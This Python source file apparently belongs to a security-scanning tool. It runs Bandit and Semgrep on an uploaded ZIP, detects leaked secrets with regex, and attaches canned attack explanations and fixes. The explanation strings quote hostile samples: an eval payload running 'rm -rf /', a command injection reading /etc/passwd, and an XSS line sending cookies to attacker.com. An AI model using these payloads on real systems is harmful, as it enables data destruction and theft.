import os
import zipfile
import subprocess
import json
import tempfile
import shutil
import re

def run_bandit_scan(folder_path):
    """
    Runs Bandit on the specified folder with a 5-minute timeout.
    """
    try:
        print(f"Starting Bandit scan on: {folder_path}")
        result = subprocess.run(
            ['python', '-m', 'bandit', '-r', folder_path, '-f', 'json'],
            capture_output=True,
            text=True,
            encoding='utf-8',
            timeout=300 # 5 minute safety timeout
        )
        
        if result.stderr:
            print(f"Bandit stderr: {result.stderr}")
            
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                issues = data.get('results', [])
                print(f"Bandit found {len(issues)} issues.")
                return issues
            except json.JSONDecodeError:
                print("Failed to parse Bandit JSON output.")
        return []
    except subprocess.TimeoutExpired:
        print(f"Bandit timed out after 300s on {folder_path}")
        return []
    except Exception as e:
        print(f"Error running Bandit: {e}")
        return []

def run_semgrep_scan(folder_path):
    """
    Runs Semgrep on the specified folder with a 5-minute timeout.
    """
    try:
        print(f"Starting Semgrep scan on: {folder_path}")
        # Using 'auto' config for default security rules
        result = subprocess.run(
            ['python', '-m', 'semgrep', 'scan', '--config', 'auto', '--json', folder_path],
            capture_output=True,
            text=True,
            encoding='utf-8',
            timeout=300 # 5 minute safety timeout
        )
        
        if result.stderr:
            print(f"Semgrep stderr: {result.stderr}")
            
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                issues = data.get('results', [])
                print(f"Semgrep found {len(issues)} issues.")
                return issues
            except json.JSONDecodeError:
                print("Failed to parse Semgrep JSON output.")
        return []
    except subprocess.TimeoutExpired:
        print(f"Semgrep timed out after 300s on {folder_path}")
        return []
    except Exception as e:
        print(f"Error running Semgrep: {e}")
        return []

def detect_secrets(folder_path):
    """
    Scans files for common secret patterns using regex.
    """
    secrets_found = []
    # Patterns for Stripe, AWS, JWT, and generic API tokens
    patterns = {
        'Stripe Secret Key': r'sk_(?:test|live)_[0-9a-zA-Z]{24}',
        'AWS Access Key': r'(?:AKIA|ASYA|ABIA|ACCA)[0-9A-Z]{16}',
        'AWS Secret Key': r'(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])',
        'JWT Secret': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
        'Generic API Token': r'(?:api_key|api_token|secret_key|secret_token|access_token|auth_token)[\'\" \t]*[:=][\'\" \t]*[0-9a-zA-Z]{32,}'
    }

    print(f"Starting Secret Detection on: {folder_path}")
    
    for root, _, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            # Skip binary files, git history, and node_modules
            if any(part in file_path for part in ['.git', 'node_modules', '__pycache__']):
                continue
                
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    for secret_name, pattern in patterns.items():
                        matches = re.finditer(pattern, content)
                        for match in matches:
                            line_num = content.count('\n', 0, match.start()) + 1
                            secrets_found.append({
                                'file': os.path.relpath(file_path, folder_path),
                                'line': line_num,
                                'type': f"Leaked {secret_name}",
                                'severity': 'CRITICAL',
                                'scanner': 'SecretScanner',
                                'ai_analysis': ai_intelligence_layer({'type': 'secret', 'secret_type': secret_name}),
                                'snippet': get_code_snippet(file_path, line_num)
                            })
            except Exception as e:
                print(f"Error scanning {file_path} for secrets: {e}")
                
    print(f"SecretScanner found {len(secrets_found)} potential leaks.")
    return secrets_found

def ai_intelligence_layer(vulnerability):
    """
    Enterprise-grade AI-driven contextual analysis.
    In a production app, this would call an LLM (OpenAI, Claude, etc.)
    """
    v_type = vulnerability.get('type', 'Unknown').lower()
    code_snippet = vulnerability.get('code', '')
    
    # Check if it's a secret leak
    if v_type == 'secret' or 'secret' in v_type:
        secret_type = vulnerability.get('secret_type', 'API Key')
        return {
            "impact": f"Unauthorized access to {secret_type} cloud resources, payment gateways, or user data.",
            "scenario": "An attacker finds this hardcoded key in your public repository and uses it to drain funds, steal user data, or compromise infrastructure.",
            "fix": "Immediately rotate and revoke this key. Use environment variables (.env files) or a secret manager (AWS Secrets Manager, HashiCorp Vault).",
            "secure_code": "# Use environment variables\nimport os\napi_key = os.getenv('MY_SECRET_KEY')"
        }

    # Mock Enterprise AI logic with attack scenarios and secure fixes
    scenarios = {
        "eval": {
            "impact": "Full code execution capability for attackers. Can lead to total server compromise.",
            "scenario": "An attacker sends a payload like '__import__(\"os\").system(\"rm -rf /\")' which your system executes directly.",
            "fix": "Use literal_eval() for data, or preferably use JSON/mapping types.",
            "secure_code": "import ast\n# Safe alternative\ndata = ast.literal_eval(user_input)"
        },
        "os.system": {
            "impact": "Remote Command Injection. Attackers can execute arbitrary shell commands.",
            "scenario": "If user input is 'file.txt ; cat /etc/passwd', the system will execute both, leaking sensitive system files.",
            "fix": "Use the 'subprocess' module with argument lists, bypassing the shell.",
            "secure_code": "import subprocess\n# Safe alternative\nsubprocess.run(['ls', '-l', filename], check=True)"
        },
        "xss": {
            "impact": "Session hijacking and credential theft via malicious script injection.",
            "scenario": "An attacker injects '<script>fetch(\"https://attacker.com/steal?\"+document.cookie)</script>' into a page viewed by admins.",
            "fix": "Implement strict output encoding and Content Security Policy (CSP).",
            "secure_code": "import html\n# Safe alternative\nsafe_output = html.escape(user_input)"
        }
    }
    
    analysis = scenarios.get(v_type, {
        "impact": "Potential security boundary violation or insecure pattern detected.",
        "scenario": "Attackers may exploit this pattern to bypass intended logic or access unauthorized data.",
        "fix": "Review the logic and apply input validation/output encoding standard practices.",
        "secure_code": "# Example: Use parameterized queries/APIs\n# check doc: https://owasp.org/www-project-top-ten/"
    })
    
    return analysis

def calculate_enterprise_risk(issues):
    """
    Enterprise Severity Scoring:
    Critical/Error = 10, High = 7, Medium = 5, Low = 3, Info = 1
    """
    if not issues:
        return 0, 0, 'A'
    
    total_score = 0
    weights = {'CRITICAL': 10, 'HIGH': 7, 'MEDIUM': 5, 'LOW': 3, 'INFO': 1, 'ERROR': 10, 'WARNING': 5}
    
    for issue in issues:
        sev = issue.get('severity', 'LOW').upper()
        total_score += weights.get(sev, 1)
        
    # Scale to 100 base
    # For this SaaS, we define 100 as a 'High Risk Threshold'
    risk_percentage = min(100, (total_score / 50) * 100) # Assuming 5 high issues = 100% risk
    
    # Grade Calculation
    if risk_percentage <= 20: grade = 'A'
    elif risk_percentage <= 40: grade = 'B'
    elif risk_percentage <= 60: grade = 'C'
    elif risk_percentage <= 80: grade = 'D'
    else: grade = 'F'
    
    return total_score, risk_percentage, grade

def get_code_snippet(file_path, line_number, context_lines=3):
    """
    Extracts a snippet of code around a specific line number.
    """
    try:
        if not os.path.exists(file_path):
            return ""
            
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        start = max(0, line_number - context_lines - 1)
        end = min(len(lines), line_number + context_lines)
        
        snippet_lines = []
        for i in range(start, end):
            prefix = ">> " if i == line_number - 1 else "   "
            snippet_lines.append(f"{prefix}{i+1} | {lines[i].rstrip()}")
            
        return "\n".join(snippet_lines)
    except Exception as e:
        print(f"Error extracting snippet: {e}")
        return ""

def aggregate_scan_results(zip_file_path):
    """
    Enterprise Aggregator: Handles ZIP/Folder, multiple scanners, and AI enhancement.
    """
    temp_dir = tempfile.mkdtemp()
    aggregated_results = []
    
    try:
        print(f"Processing Enterprise Scan: {zip_file_path}")
        with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)
        
        # 1. Run Bandit (Python)
        try:
            bandit_issues = run_bandit_scan(temp_dir)
            for issue in bandit_issues:
                try:
                    v_type_raw = issue.get('issue_text', 'unknown')
                    v_type = 'eval' if 'eval' in v_type_raw.lower() else 'os.system' if 'system' in v_type_raw.lower() else 'unknown'
                    ai_data = ai_intelligence_layer({'type': v_type})
                    
                    file_abs = issue.get('filename')
                    line_num = issue.get('line_number')
                    snippet = get_code_snippet(file_abs, line_num)

                    aggregated_results.append({
                        'file': os.path.relpath(file_abs, temp_dir),
                        'line': line_num,
                        'type': v_type_raw,
                        'severity': issue.get('issue_severity'),
                        'scanner': 'Bandit',
                        'ai_analysis': ai_data,
                        'snippet': snippet
                    })
                except Exception as ie:
                    print(f"Error processing Bandit issue: {ie}")
        except Exception as be:
            print(f"Bandit aggregator error: {be}")

        # 2. Run Semgrep (General / Multi-lang)
        try:
            semgrep_issues = run_semgrep_scan(temp_dir)
            for issue in semgrep_issues:
                try:
                    extra = issue.get('extra', {})
                    msg = extra.get('message', '')
                    v_type = 'xss' if 'xss' in msg.lower() else 'unknown'
                    ai_data = ai_intelligence_layer({'type': v_type})
                    
                    file_abs = os.path.join(temp_dir, issue.get('path'))
                    line_num = issue.get('start', {}).get('line')
                    snippet = get_code_snippet(file_abs, line_num)

                    aggregated_results.append({
                        'file': os.path.relpath(issue.get('path'), temp_dir) if os.path.isabs(issue.get('path')) else issue.get('path'),
                        'line': line_num,
                        'type': msg,
                        'severity': extra.get('severity', 'MEDIUM'),
                        'scanner': 'Semgrep',
                        'ai_analysis': ai_data,
                        'snippet': snippet
                    })
                except Exception as se:
                    print(f"Error processing Semgrep issue: {se}")
        except Exception as sge:
            print(f"Semgrep aggregator error: {sge}")

        # 3. Run Custom Secret Scanner
        try:
            secret_issues = detect_secrets(temp_dir)
            aggregated_results.extend(secret_issues)
        except Exception as se:
            print(f"Secret detection error: {se}")

        print(f"Aggregated {len(aggregated_results)} total vulnerabilities.")
        return aggregated_results
    finally:
        shutil.rmtree(temp_dir)
